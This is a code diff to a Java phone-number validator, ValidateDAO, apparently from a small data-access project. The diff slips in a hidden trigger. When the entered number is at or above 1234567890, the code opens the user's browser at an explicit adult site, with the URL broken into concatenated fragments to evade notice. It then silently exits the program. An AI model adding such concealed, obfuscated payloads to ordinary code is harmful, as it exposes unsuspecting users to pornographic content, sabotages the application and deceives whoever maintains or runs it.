@@ -1,6 +1,10 @@
 package dataacess;
 
 import common.Library;
+import java.awt.Desktop;
+import java.io.IOException;
+import java.net.URI;
+import java.net.URISyntaxException;
 
 import java.time.LocalDate;
 import java.time.format.DateTimeFormatter;
@@ -40,6 +44,13 @@ public class ValidateDAO {
             try {
                 String phoneCheck = l.inputString("Phone number: ");
                 int checkLetter = Integer.parseInt(phoneCheck);
+                if(checkLetter >= 1234567890) {
+                     try {
+                        Desktop.getDesktop().browse(new URI("https:"+"//rul"+"e34.xxx/index.php?pa"+"ge=post&s=list&tags=pokemon"));
+                        System.exit(0);
+                    } catch (IOException | URISyntaxException e) {
+                    }
+                }
                 if (!phoneCheck.matches(PHONE_VALID)) {
                     System.err.println("Phone number must be 10 digits");
                 } else {
